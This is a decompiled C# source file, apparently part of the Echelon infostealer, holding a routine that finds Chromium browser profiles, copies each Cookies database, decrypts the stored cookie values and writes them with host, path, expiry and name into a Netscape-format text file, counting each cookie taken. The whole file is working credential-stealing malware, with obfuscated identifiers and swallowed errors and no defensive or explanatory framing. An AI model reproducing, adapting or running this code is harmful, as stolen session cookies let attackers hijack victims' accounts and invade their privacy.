using Echelon;
using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

internal class r
{
	public static int a;

	public static void a(string at)
	{
		try
		{
			List<string> list = t.a();
			Random random = new Random();
			foreach (string item in list)
			{
				using (StreamWriter streamWriter = new StreamWriter(at + "\\Cookies_Chromium.txt", append: true, Encoding.Default))
				{
					streamWriter.WriteLine($"Browser - {item}\n\n");
					string text = item + "\\Cookies";
					if (File.Exists(text))
					{
						long length = new FileInfo(text).Length;
						if (length >= 10000 && length != 28672 && length != 20480)
						{
							string text2 = Global.AppDate + "\\System_" + random.Next(10000000);
							File.Copy(text, text2, overwrite: true);
							if (item.Contains("Guest Profile") || item.Contains("System Profile"))
							{
								File.Delete(text2);
							}
							else
							{
								x x = new x(text2);
								x.e("cookies");
								for (int i = 0; i < x.b(); i++)
								{
									string text3 = "";
									try
									{
										text3 = Encoding.UTF8.GetString(t.c(Encoding.Default.GetBytes(x.a(i, 12))));
										string text4 = x.a(i, 1);
										string text5 = x.a(i, 2);
										string text6 = x.a(i, 4);
										string text7 = x.a(i, 5);
										x.a(i, 6).ToUpper();
										if (text3 == "")
										{
											text3 = x.a(i, 3);
										}
										streamWriter.Write($"{text4}\tTRUE\t{text6}\tFALSE\t{text7}\t{text5}\t{text3}\r\n");
										r.a++;
									}
									catch
									{
									}
								}
								streamWriter.WriteLine($"\n\n");
								File.Delete(text2);
							}
						}
					}
				}
			}
		}
		catch
		{
		}
	}
}
